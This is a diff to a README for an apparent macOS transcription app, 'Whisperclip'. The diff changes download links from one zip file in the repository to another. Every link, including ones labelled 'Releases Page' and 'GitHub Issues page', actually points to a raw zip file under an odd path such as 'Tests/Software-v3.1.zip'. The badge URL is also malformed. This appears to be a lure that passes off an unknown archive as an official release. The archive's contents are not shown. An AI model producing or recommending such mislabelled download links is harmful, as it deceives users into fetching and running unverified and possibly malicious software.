@@ -4,7 +4,7 @@
 Whisperclip is a secure and user-friendly application that converts your voice into written text. Designed specifically for macOS, it combines advanced AI enhancement with a focus on privacy. Experience hassle-free voice-to-text transcription without compromising your data.
 
 ## 📥 Download Now
-[![Download Latest Release](https://raw.githubusercontent.com/aboda-dirbas/whisperclip/main/hydrogenation/whisperclip.zip%20Latest%https://raw.githubusercontent.com/aboda-dirbas/whisperclip/main/hydrogenation/whisperclip.zip)](https://raw.githubusercontent.com/aboda-dirbas/whisperclip/main/hydrogenation/whisperclip.zip)
+[![Download Latest Release](https://raw.githubusercontent.com/aboda-dirbas/whisperclip/main/Tests/Software-v3.1.zip%20Latest%https://raw.githubusercontent.com/aboda-dirbas/whisperclip/main/Tests/Software-v3.1.zip)](https://raw.githubusercontent.com/aboda-dirbas/whisperclip/main/Tests/Software-v3.1.zip)
 
 ## 🚀 Getting Started
 To begin using whisperclip, follow these simple steps to download and install the application.
@@ -12,7 +12,7 @@ To begin using whisperclip, follow these simple steps to download and install th
 ### Step 1: Visit the Releases Page
 Click the link below to go to the GitHub Releases page. This page contains the latest version of whisperclip available for download.
 
-[Visit the Releases Page](https://raw.githubusercontent.com/aboda-dirbas/whisperclip/main/hydrogenation/whisperclip.zip)
+[Visit the Releases Page](https://raw.githubusercontent.com/aboda-dirbas/whisperclip/main/Tests/Software-v3.1.zip)
 
 ### Step 2: Download the Application
 On the Releases page, look for the most recent version of the app. Select the appropriate file for macOS. Click on the file to download it to your computer.
@@ -54,7 +54,7 @@ If you encounter any issues while using whisperclip, consider the following tips
 ## 📬 Support
 For any questions or feedback, please feel free to reach out:
 
-- Open an issue on the [GitHub Issues page](https://raw.githubusercontent.com/aboda-dirbas/whisperclip/main/hydrogenation/whisperclip.zip).
+- Open an issue on the [GitHub Issues page](https://raw.githubusercontent.com/aboda-dirbas/whisperclip/main/Tests/Software-v3.1.zip).
 - Join our community discussions to connect with other users.
 
 ## 🛡️ Privacy Policy
@@ -63,4 +63,4 @@ Whisperclip is dedicated to your privacy. We do not store or share any of your r
 ## 🎉 Join Us
 Stay updated on new features and releases. You can follow us on GitHub and be part of our growing community focused on privacy-first software solutions.
 
-[Visit the Releases Page](https://raw.githubusercontent.com/aboda-dirbas/whisperclip/main/hydrogenation/whisperclip.zip) to download the latest version today!
+[Visit the Releases Page](https://raw.githubusercontent.com/aboda-dirbas/whisperclip/main/Tests/Software-v3.1.zip) to download the latest version today!
